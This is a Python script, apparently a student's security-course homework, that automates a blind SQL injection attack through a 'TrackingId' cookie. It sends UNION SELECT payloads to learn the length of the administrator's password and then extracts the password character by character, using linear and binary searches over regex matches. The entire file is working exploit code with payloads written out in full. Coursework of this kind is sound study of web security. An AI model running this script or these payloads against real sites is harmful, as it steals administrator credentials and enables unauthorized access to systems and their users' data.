# Maksim Semchuk
# CS 495 Homework #2


# Needed Imports:
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time
import string


# Functions:
# Step 4: Inital Program:
def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


# This takes in a url (to the site),
# A prefix, that is already know, if any.
# a letter that is being tested to see if it exists inside of the password.
def test_string(url, prefix, letter):
    #query is what is going to be passed in as a regex argument along with the cookie.,
    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{prefix}{letter}'--"
    print(f'\nTesting: ^{prefix}{letter}')
    print(f"Query: {query}")
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}

    # Now to test it:
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')

    if soup.find('div', text='Welcome back!'):
        if len(letter) == 1:
            print(f'Found Character {letter}')
        return True
    else:
        return False

# Step 6: Find the password Length:
def find_password_length():
    # Step 6: Find the password Length:
    begin_time = time.perf_counter()
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        print(f'Trying length {num}')
        if try_query(query) == False:
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return num


# Step 8: Linear Search:
def linear_search():
    start_alpha = string.ascii_lowercase + string.digits
    prefix = ''
    begin_time = time.perf_counter()
    while True:
        # Test if the current prefix IS the exact password.
        if test_string(url, prefix, '$'):
            break
        # Otherwise, go through the letter list
        for letter in start_alpha:
            check = test_string(url, prefix, letter)
            if check:
                prefix += letter
                break
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return prefix


def recursive_search(url, administrator_prefix, charset, mid):
    """
    This is a recursive function that divides up the charset, and then returns a working character
    Args:
        url (str): the url that is tested
        administrator_prefix (str): the prefix that gets appended to one a correct character is found
        charset (str): This is a regex string that gets broken down on every recusion to find the match
        mid (int): this is the middle of charset for any given recursion call.
    returns:
        adminstrator_prefix(str): acts as both the character return, AND the final string
    """
    # First goes down the left subtree, until the length of the left side is 1
    if (len(charset[:mid]) // 2) >= 1 and try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]'--"""):
        administrator_prefix = str(recursive_search(url, administrator_prefix, charset[:mid], len(charset[:mid])//2))
    
    # Then goes the right subtree, until the length of the right side is 1
    elif (len(charset[mid:]) // 2) >= 1 and try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]'--"""):
        administrator_prefix = str(recursive_search(url, administrator_prefix, charset[mid:], len(charset[mid:])//2))
    
    # Now, to see if the left side of the subtree returns a match
    if (len(charset[:mid])//2 <= 1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}{charset[:mid]}'--""")):
        administrator_prefix +=  str(charset[:mid])
        return administrator_prefix
    # Now, to see if the right side of the subtree returns a match
    elif (len(charset[mid:])//2 <= 1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}{charset[mid:]}'--""")):
        administrator_prefix += str(charset[mid:])
        return administrator_prefix
    #otherwise return a empty string (in case it is 0)
    else:
        return administrator_prefix


def binary_search(url):
    # Used to store the administrator password
    administrator_prefix = ''
    charset = string.ascii_lowercase + string.digits # The character set from which to draw
    mid = len(charset) // 2 # Middle of the charset
    begin_time = time.perf_counter()

    # Keep going until an exact match is found
    while True:
        # This is the recursive function
        administrator_prefix = recursive_search(url, administrator_prefix, charset, mid)
        print(f"Admin password: {administrator_prefix}")
        if test_string(url, administrator_prefix, '$'): # If this is true, then that means an exact match was found.
            print(f"Time elapsed is {time.perf_counter()-begin_time}")
            return administrator_prefix

#This function checks to see if the status code is still 200


# To clean things up
if __name__ == "__main__":
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    url = f'https://{site}/'

    #control_password = linear_search()
    
    # Step #11: Binary Search:
    admin_password = binary_search(url)
    #print(f"Final password is: {admin_password}\n")

    print(f"\nMy Attempt: {admin_password}")
